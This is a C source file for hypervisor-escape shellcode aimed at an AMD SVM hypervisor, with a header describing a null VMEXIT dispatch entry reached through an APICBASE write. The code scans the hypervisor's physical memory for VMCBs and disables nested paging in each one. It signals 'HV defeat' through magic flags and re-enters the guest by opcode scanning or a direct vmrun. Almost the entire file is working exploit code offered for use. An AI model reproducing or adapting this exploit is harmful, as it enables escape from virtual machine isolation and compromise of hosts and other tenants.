/*
 * shellcode_hv_960/main.c
 *
 * Runs at PA=0 in HV context after WRMSR(MSR_APICBASE, hv_stack|0x900)
 * triggers a VMEXIT. The HV dispatch table entry for APICBASE write is
 * null → CPU calls VA=0 → PA=0 → this code.
 *
 * Strategy: dynamically scan the HV physical region [0x62800000..0x64800000]
 * for VMCBs (identified by NESTED_CTRL at offset 0x90 having NP_ENABLE bit set).
 * Clear NP_ENABLE on every VMCB found, write success flag, restore APICBASE,
 * find hv_reenter_hypercore by scanning for vmload+vmrun opcode sequence, call it.
 */

#include "utils.h"
#include <stdint.h>

#define MSR_APICBASE        0x01bU
#define DEFAULT_APIC_BASE   0xfee00000ULL
#define APICBASE_ENABLED    0x00000800ULL
#define APICBASE_BSP        0x00000100ULL

/* AMD SVM VMCB control area: NESTED_CTRL at offset 0x90 */
#define NESTED_CTRL_NP_ENABLE  0x1ULL

/* Success flag written to PA=0x1000 so ring-0 can detect HV defeat */
#define SUCCESS_FLAG_PA     ((volatile uint32_t *)0x1000UL)
#define SUCCESS_MAGIC       0xDEADB00FUL
/* Secondary flag at PA=0x1004: set to 0xCAFEBABE if hv_reenter was found */
#define REENTER_FLAG_PA     ((volatile uint32_t *)0x1004UL)
#define REENTER_FOUND       0xCAFEBABEUL

/* HV physical region to scan for VMCBs */
#define HV_SCAN_START       0x62800000UL
#define HV_SCAN_END         0x64800000UL
#define VMCB_STEP           0x2000UL     /* VMCBs are 0x2000 apart */

/* Range to scan for hv_reenter_hypercore (vmload+vmrun = 0F 01 DA 0F 01 D8) */
#define HV_CODE_SCAN_END    0x64800000UL

static void defeat_npt(void) {
    for (uint64_t addr = HV_SCAN_START; addr < HV_SCAN_END; addr += VMCB_STEP) {
        volatile uint64_t *nested_ctrl = (volatile uint64_t *)(addr + 0x90);
        uint64_t val = *nested_ctrl;
        if (val & NESTED_CTRL_NP_ENABLE)
            *nested_ctrl = val & ~NESTED_CTRL_NP_ENABLE;
    }
}

/* Scan HV code region for vmload (0F 01 DA) immediately followed by vmrun (0F 01 D8) */
static void (*find_hv_reenter(void))(void) {
    for (uint64_t addr = HV_SCAN_START; addr < HV_CODE_SCAN_END - 5; addr++) {
        const uint8_t *p = (const uint8_t *)addr;
        if (p[0] == 0x0F && p[1] == 0x01 && p[2] == 0xDA &&
            p[3] == 0x0F && p[4] == 0x01 && p[5] == 0xD8)
            return (void (*)(void))addr;
    }
    return (void (*)(void))0;
}

void hv_main_c(void) {
    defeat_npt();

    /* Signal ring-0 that HV defeat succeeded */
    *SUCCESS_FLAG_PA = SUCCESS_MAGIC;

    /* Restore APIC base so the guest kernel doesn't crash */
    wrmsr(MSR_APICBASE, DEFAULT_APIC_BASE | APICBASE_ENABLED | APICBASE_BSP);

    /* Re-enter the hypercore — resumes guest execution */
    void (*hv_reenter)(void) = find_hv_reenter();
    if (hv_reenter) {
        *REENTER_FLAG_PA = REENTER_FOUND;
        hv_reenter();
        /* Should not return; fall through to vmrun fallback */
    }

    /*
     * hv_reenter not found (or returned).
     * Fallback: scan VMCBs for the one in VMEXIT state (exit_code = 0x7C =
     * SVM_EXIT_MSR = our WRMSR APICBASE write) and do vmrun directly.
     * VMCB offsets (AMD APM): exit_code at +0x70 (u32), VMCB_CLEAN at +0xC0.
     */
    for (uint64_t addr = HV_SCAN_START; addr < HV_SCAN_END; addr += VMCB_STEP) {
        volatile uint32_t *exit_code = (volatile uint32_t *)(addr + 0x70);
        if (*exit_code == 0x7CUL) {
            /* Force VMCB full reload to pick up NP_ENABLE clear */
            *(volatile uint32_t *)(addr + 0xC0) = 0;
            uint64_t vmcb_pa = addr;
            /* vmrun re-enters guest without vmload (sufficient for ring-0 reentry) */
            __asm__ volatile("vmrun %%rax" :: "a"(vmcb_pa) : "memory");
            break;
        }
    }

    /* If we're still here: all attempts failed */
    *SUCCESS_FLAG_PA = 0xDEADDEADUL;
    while (1)
        __asm__ volatile("hlt");
}

/*
 * Entry point: first bytes of the binary, placed at PA=0.
 * naked so no prologue/epilogue. We call hv_main_c which uses the
 * HV's existing stack (valid at the point the null dispatch was called).
 */
__attribute__((section(".entry_point"), naked)) void main(void) {
    __asm__ volatile(
        "callq hv_main_c\n\t"
        "cli\n\t"
        "hlt\n\t"
    );
}
